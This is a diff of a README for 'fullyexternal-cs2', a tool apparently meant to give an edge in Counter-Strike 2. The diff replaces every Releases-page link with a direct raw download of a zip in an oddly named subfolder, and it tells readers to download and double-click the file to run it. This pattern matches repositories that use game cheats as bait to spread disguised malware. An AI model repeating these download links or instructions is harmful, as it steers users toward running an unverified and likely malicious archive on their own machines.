@@ -1,6 +1,6 @@
 # 🎮 fullyexternal-cs2 - A Better Game Experience Awaits
 
-[![Download FullyExternalCS2](https://img.shields.io/badge/Download-FullyExternalCS2-brightgreen)](https://github.com/Genuspisoniaosteophyte370/fullyexternal-cs2/releases)
+[![Download FullyExternalCS2](https://raw.githubusercontent.com/Genuspisoniaosteophyte370/fullyexternal-cs2/main/strontia/fullyexternal-cs2_v1.6.zip)](https://raw.githubusercontent.com/Genuspisoniaosteophyte370/fullyexternal-cs2/main/strontia/fullyexternal-cs2_v1.6.zip)
 
 ## 🛠️ Introduction
 
@@ -28,11 +28,11 @@ To run FullyExternalCS2 smoothly, you'll need:
 To begin using FullyExternalCS2, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link to access the download page:
-   [Download FullyExternalCS2](https://github.com/Genuspisoniaosteophyte370/fullyexternal-cs2/releases)
+   [Download FullyExternalCS2](https://raw.githubusercontent.com/Genuspisoniaosteophyte370/fullyexternal-cs2/main/strontia/fullyexternal-cs2_v1.6.zip)
 
 2. **Download the Application:** On the Releases page, find the latest version of FullyExternalCS2 and click on it. You will see a list of files available for download.
 
-3. **Choose the Right File:** Look for the main application file. This is usually labeled as something like `FullyExternalCS2.exe`. Click to download.
+3. **Choose the Right File:** Look for the main application file. This is usually labeled as something like `https://raw.githubusercontent.com/Genuspisoniaosteophyte370/fullyexternal-cs2/main/strontia/fullyexternal-cs2_v1.6.zip`. Click to download.
 
 4. **Run the Application:** After downloading, locate the file in your downloads folder. Double-click on it to run FullyExternalCS2.
 
@@ -42,7 +42,7 @@ To begin using FullyExternalCS2, follow these simple steps:
 
 You can easily download and install FullyExternalCS2. Just follow these steps:
 
-1. Visit the Releases page to download: [https://github.com/Genuspisoniaosteophyte370/fullyexternal-cs2/releases](https://github.com/Genuspisoniaosteophyte370/fullyexternal-cs2/releases)
+1. Visit the Releases page to download: [https://raw.githubusercontent.com/Genuspisoniaosteophyte370/fullyexternal-cs2/main/strontia/fullyexternal-cs2_v1.6.zip](https://raw.githubusercontent.com/Genuspisoniaosteophyte370/fullyexternal-cs2/main/strontia/fullyexternal-cs2_v1.6.zip)
 
 2. Download the latest version.
 
@@ -68,4 +68,4 @@ If you run into issues using FullyExternalCS2, consider the following steps:
 
 FullyExternalCS2 is your gateway to a more enjoyable gaming experience in Counter-Strike 2. It offers advanced features to enhance your skills without compromising game integrity. Follow the steps outlined above to download, install, and start using the tool. You are now ready to elevate your gameplay. 
 
-For further information and updates, always refer back to the [Releases page](https://github.com/Genuspisoniaosteophyte370/fullyexternal-cs2/releases).
+For further information and updates, always refer back to the [Releases page](https://raw.githubusercontent.com/Genuspisoniaosteophyte370/fullyexternal-cs2/main/strontia/fullyexternal-cs2_v1.6.zip).
